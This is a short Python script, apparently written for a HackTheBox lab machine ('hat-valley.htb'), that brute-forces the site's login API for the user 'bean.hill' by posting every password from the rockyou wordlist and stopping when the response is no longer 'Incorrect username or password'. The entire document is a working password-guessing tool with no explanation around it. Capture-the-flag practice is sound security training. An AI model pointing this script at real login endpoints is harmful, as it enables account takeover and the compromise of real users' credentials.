from requests import post
import time

wordlist = "/usr/share/wordlists/rockyou.txt"
found = False
pwn = "nope"
request = "ayy"
usern = "bean.hill"

def ayy(username, password):
        endpoint = "http://hat-valley.htb/api/login"
        headers = ""
        payload = {
            "username" : username,
            "password" : password,
        }
        r = post(endpoint, json=payload, headers = headers)
        print("[+] " + r.text)
        return r.text

with open(wordlist,'r') as mariob:
    while found == False:
        for passWL in mariob:
            for pasw in passWL.split():
                print("[+++] testing " + usern + ":" + pasw)
                if ayy(usern, pasw) == "Incorrect username or password":
                    print("[+] Found?: " + str(found))
                    time.sleep(.01)
                else:
                    pwn = pasw
                    found = True
                    print("[+] Found?: " + str(found))
    else:
        print(pasw)
        exit()
